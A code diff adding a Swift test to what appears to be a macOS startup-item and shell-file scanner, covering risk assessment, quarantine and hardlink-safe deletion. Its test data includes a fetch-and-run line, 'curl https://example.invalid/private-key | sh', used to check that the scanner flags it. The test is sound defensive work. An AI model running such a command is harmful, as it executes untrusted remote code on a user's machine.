@@ -121,6 +121,27 @@ final class CoreChecks {
         let target = outside.appendingPathComponent("file"); try Data("safe".utf8).write(to: target)
         try checkThrows(try store.quarantine(path: redirected.appendingPathComponent("file").path, expectedHash: fileSHA256(target)))
     }
+    func testShellAssessmentAndPermanentQuarantineRemoval() throws {
+        let (base, store) = try fixture(); let file = base.appendingPathComponent(".zshrc")
+        let fixture = "# private comment\nexport PATH=/usr/bin:$PATH\n"
+        try Data(fixture.utf8).write(to: file)
+        let finding = Finding(path: file.path, title: ".zshrc", category: "Shell scripts", level: .review, explanation: "Startup", evidence: [], action: .quarantine, home: base.path)
+        try checkEqual(LocalAssessment.assess(finding, verifiedTeam: nil, signatureInvalid: false, text: fixture).verdict, "Common setup file")
+        try checkEqual(LocalAssessment.assess(finding, verifiedTeam: nil, signatureInvalid: false, text: nil).verdict, "More information needed")
+        let risky = LocalAssessment.assess(finding, verifiedTeam: nil, signatureInvalid: false, text: "curl https://example.invalid/private-key | sh")
+        try checkEqual(risky.verdict, "Investigate before trusting")
+        try checkFalse(try String(decoding: JSONEncoder().encode(risky), as: UTF8.self).contains("private-key"))
+        try checkEqual(LocalAssessment.assess(finding, verifiedTeam: "TESTTEAM", signatureInvalid: false, text: nil).verdict, "Verified publisher")
+        try checkFalse(store.eligible(base.appendingPathComponent(".ssh/id_rsa").path))
+        let receipt = try store.quarantine(path: file.path, expectedHash: fileSHA256(file))
+        let copy = store.directory.appendingPathComponent(receipt.id)
+        let outside = base.appendingPathComponent("hardlink")
+        try FileManager.default.linkItem(at: copy, to: outside)
+        try checkThrows(try store.remove(receipt)); try checkTrue(FileManager.default.fileExists(atPath: copy.path))
+        try FileManager.default.removeItem(at: outside)
+        try store.remove(receipt); try checkTrue(store.receipts().isEmpty)
+        try checkFalse(FileManager.default.fileExists(atPath: copy.path)); try checkThrows(try store.restore(receipt))
+    }
     func testCancelledRunnerCannotStartAnotherProcessUntilExplicitReset() throws {
         let runner = ProcessRunner(); runner.cancel()
         try checkThrows(try runner.run(URL(fileURLWithPath: "/usr/bin/true"), []))
@@ -191,6 +212,7 @@ func unwrap<T>(_ value: T?) throws -> T { guard let value else { throw CheckFail
             ("Startup inventory paths and conservative classification", checks.testInventoryPreservesBinaryAndStartupPathsWithoutCallingUnsignedMalware),
             ("Quarantine, restore and replacement protection", checks.testQuarantineAndRestoreNeverOverwriteReplacement),
             ("Changed file, symlink and hardlink rejection", checks.testCleanupRejectsChangedFilesSymlinksAndHardlinks),
+            ("Local evidence and supported shell quarantine/deletion", checks.testShellAssessmentAndPermanentQuarantineRemoval),
             ("Cancellation prevents subsequent process execution", checks.testCancelledRunnerCannotStartAnotherProcessUntilExplicitReset),
             ("Keyboard tap filtering, grouping and conservative classification", checks.testKeyboardReviewGroupsAppsWithoutCallingListenersMalware),
             ("Keyboard refresh, encryption and older report compatibility", checks.testKeyboardRefreshPreservesOtherResultsAndOlderReportCompatibility)
